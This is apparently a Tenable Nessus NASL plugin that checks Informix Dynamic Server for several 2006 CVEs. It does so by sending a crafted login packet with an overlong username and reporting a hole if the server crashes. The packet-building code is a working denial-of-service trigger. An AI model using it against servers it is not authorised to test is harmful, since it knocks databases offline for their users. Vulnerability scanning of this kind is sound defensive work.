#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(22229);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-3853", "CVE-2006-3855", "CVE-2006-3856", "CVE-2006-3857",
                "CVE-2006-3858", "CVE-2006-3860", "CVE-2006-3861", "CVE-2006-3862");
  script_bugtraq_id(19264);
  script_osvdb_id(
    27681,
    27682,
    27683,
    27684,
    27685,
    27686,
    27687,
    27688,
    27689,
    27690,
    27691,
    27692,
    27693,
    27694
  );

  script_name(english:"Informix Dynamic Server Multiple Remote Vulnerabilities");
  script_summary(english:"Tries to crash Informix Dynamic Server with a long username");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that is affected by several
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of Informix Dynamic Server installed on the remote host
contains multiple vulnerabilities that may allow attackers to execute
arbitrary code, gain elevated privileges, uncover sensitive
information, deny service to legitimate users, etc.  Some of these
issues can be exploited remotely without authentication." );
 script_set_attribute(attribute:"see_also", value:"http://www-1.ibm.com/support/docview.wss?uid=swg21242921" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Informix 10.00.xC4 / 9.40.xD8 / 7.31.xD9 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/31");
 script_cvs_date("$Date: 2011/03/11 21:52:34 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");
  script_dependencies("informix_detect.nasl");
  script_require_ports("Services/informix", 1526);

  exit(0);
}


include("byte_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/informix");
if (!port) port = 1526;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Try to log in with a long username.
user = crap(0x410);
pass = SCRIPT_NAME;
db = "sysmaster";
dbpath = "ol_nessus";
zero = raw_string(0x00);

req = raw_string(
  "sq",                                # header
  crap(8),                             # length + constant (to be filled in later)
  "sqlexec ",                          # magic
  user, " -p", pass, " ",              # credentials
  "9.22.TC1   ",                       # client version
  "RDS#N000000 ",                      # RDS
  "-d", db, " ",                       # database
  "-fIEEEI ",                          # IEEE
  "DBPATH=//", dbpath, " ",            # dbpath
  "CLIENT_LOCALE=en_US.CP1252 ",       # client locale
  "DB_LOCALE=en_US.819 ",              # db locale
  ":",
  "AG0AAAA9b3IAAAAAAAAAAAA9c29jdGNwAAAAAAABAAABMQAAAAAAAAAAc3FsZXh",
  "lYwAAAAAAAAVzcWxpAAACAAAAAwAKb2xfbmVzc3VzAABrAAAAAAAAnmUAAAAAAA",
  "duZXNzdXMAAAduZXNzdXMAAC1DOlxQcm9ncmFtIEZpbGVzXE5lc3N1c1xpbmZvc",
  "m1peF9kZXRlY3QubmFzbAAAdAAIAAAE0gAAAAAAfwo="
);
req = insstr(req, base64(str:raw_string(mkword(strlen(req)-4), 0x01, 0x3d, zero, zero)), 2, 9);

send(socket:soc, data:req);
res = recv(socket:soc, length:4096, timeout:20);
close(soc);


# If we didn't get a response...
if (isnull(res))
{
  # Check for a bit to see if it's down.
  max_tries = 3;
  for (try=0; try<max_tries; try++)
  {
    sleep(5);
    soc = open_sock_tcp(port);
    if (soc) close(soc);
    else
    {
      security_hole(port);
      exit(0);
    }
  }
}
